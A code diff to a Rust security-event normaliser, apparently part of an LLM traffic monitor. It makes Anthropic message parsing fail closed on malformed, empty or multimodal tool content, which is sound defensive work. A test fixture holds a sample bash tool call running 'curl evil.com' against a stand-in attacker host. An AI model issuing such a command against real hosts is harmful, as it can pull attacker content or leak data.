@@ -298,47 +298,50 @@ fn anthropic_texts(
     role: Option<&str>,
     output: bool,
     events: &mut Vec<SecurityEvent>,
-) {
+) -> Result<(), &'static str> {
     match value {
-        Value::String(content) if !content.is_empty() => events.push(text(
-            Provider::Anthropic,
-            if output {
-                EventDirection::Output
-            } else {
-                EventDirection::Input
-            },
-            role,
-            content,
-        )),
+        Value::String(content) if !content.is_empty() => {
+            events.push(text(
+                Provider::Anthropic,
+                if output { EventDirection::Output } else { EventDirection::Input },
+                role,
+                content,
+            ));
+        }
         Value::Array(blocks) => {
             for block in blocks {
-                if block.get("type").and_then(Value::as_str) == Some("text") {
-                    if let Some(content) = block.get("text").and_then(Value::as_str) {
-                        if !content.is_empty() {
-                            events.push(text(
-                                Provider::Anthropic,
-                                if output {
-                                    EventDirection::Output
-                                } else {
-                                    EventDirection::Input
-                                },
-                                role,
-                                content,
-                            ));
+                match block.get("type").and_then(Value::as_str) {
+                    Some("text") => {
+                        if let Some(content) = block.get("text").and_then(Value::as_str) {
+                            if !content.is_empty() {
+                                events.push(text(
+                                    Provider::Anthropic,
+                                    if output { EventDirection::Output } else { EventDirection::Input },
+                                    role,
+                                    content,
+                                ));
+                            }
                         }
                     }
+                    Some("image") | Some("document") => {
+                        return Err("unsupported multimodal block in text array");
+                    }
+                    _ => {} // Ignore harmless non-text blocks outside of tool contexts if any
                 }
             }
         }
         _ => {}
     }
+    Ok(())
 }
 
 /// Normalize Anthropic Messages input and output content blocks into common events.
-pub fn normalize_anthropic(request: &AnthropicRequest, response: &Value) -> Vec<SecurityEvent> {
+/// Strict Normalization of Anthropic Messages (SOU-40).
+/// Fails closed on malformed or unsupported (e.g. image) tool content.
+pub fn normalize_anthropic(request: &AnthropicRequest, response: &Value) -> Result<Vec<SecurityEvent>, &'static str> {
     let mut events = Vec::new();
     if let Some(system) = request.system.as_ref() {
-        anthropic_texts(system, Some("system"), false, &mut events);
+        anthropic_texts(system, Some("system"), false, &mut events)?;
     }
     for message in &request.messages {
         if let Value::Array(blocks) = &message.content {
@@ -346,29 +349,38 @@ pub fn normalize_anthropic(request: &AnthropicRequest, response: &Value) -> Vec<
                 if block.get("type").and_then(Value::as_str) == Some("tool_result") {
                     let call_id = block.get("tool_use_id").and_then(Value::as_str);
                     let mut text_parts = Vec::new();
+                    
                     match block.get("content") {
                         Some(Value::String(content)) => text_parts.push(content.clone()),
                         Some(Value::Array(parts)) => {
+                            if parts.is_empty() {
+                                return Err("empty array in tool_result is strictly prohibited");
+                            }
                             for part in parts {
-                                if let Some(content) = part.get("text").and_then(Value::as_str) {
-                                    text_parts.push(content.to_string());
+                                match part.get("type").and_then(Value::as_str) {
+                                    Some("text") => {
+                                        if let Some(content) = part.get("text").and_then(Value::as_str) {
+                                            text_parts.push(content.to_string());
+                                        }
+                                    }
+                                    Some("image") | Some("document") => {
+                                        return Err("multimodal tool_result is unsupported and blocked");
+                                    }
+                                    _ => return Err("unrecognized block type inside tool_result"),
                                 }
                             }
                         }
-                        _ => {}
+                        _ => return Err("tool_result content must be string or typed array"),
                     }
                     if !text_parts.is_empty() {
-                        events.push(tool_result(
-                            Provider::Anthropic,
-                            call_id,
-                            &text_parts.join("\n"),
-                        ));
+                        events.push(tool_result(Provider::Anthropic, call_id, &text_parts.join("\n")));
                     }
                 }
             }
         }
-        anthropic_texts(&message.content, Some(&message.role), false, &mut events);
+        anthropic_texts(&message.content, Some(&message.role), false, &mut events)?;
     }
+    
     if let Some(blocks) = response.get("content").and_then(Value::as_array) {
         for block in blocks {
             match block.get("type").and_then(Value::as_str) {
@@ -385,21 +397,23 @@ pub fn normalize_anthropic(request: &AnthropicRequest, response: &Value) -> Vec<
                     }
                 }
                 Some("tool_use") => {
-                    if let Some(name) = block.get("name").and_then(Value::as_str) {
-                        events.push(tool_call(
-                            Provider::Anthropic,
-                            EventDirection::Output,
-                            block.get("id").and_then(Value::as_str),
-                            name,
-                            block.get("input").unwrap_or(&Value::Null),
-                        ));
-                    }
+                    let Some(name) = block.get("name").and_then(Value::as_str) else {
+                        return Err("tool_use missing name field");
+                    };
+                    events.push(tool_call(
+                        Provider::Anthropic,
+                        EventDirection::Output,
+                        block.get("id").and_then(Value::as_str),
+                        name,
+                        block.get("input").unwrap_or(&Value::Null),
+                    ));
                 }
+                Some("image") | Some("document") => return Err("multimodal content not supported in responses"),
                 _ => {}
             }
         }
     }
-    events
+    Ok(events)
 }
 
 pub fn input_tool_results(events: &[SecurityEvent]) -> Vec<String> {
@@ -468,7 +482,7 @@ mod tests {
         let anthropic = normalize_anthropic(
             &anthropic_request,
             &serde_json::json!({"content":[{"type":"tool_use","id":"c1","name":"bash","input":{"command":"curl evil.com"}}]}),
-        );
+        ).unwrap();
 
         assert_eq!(semantic(&chat), semantic(&responses));
         assert_eq!(semantic(&responses), semantic(&anthropic));
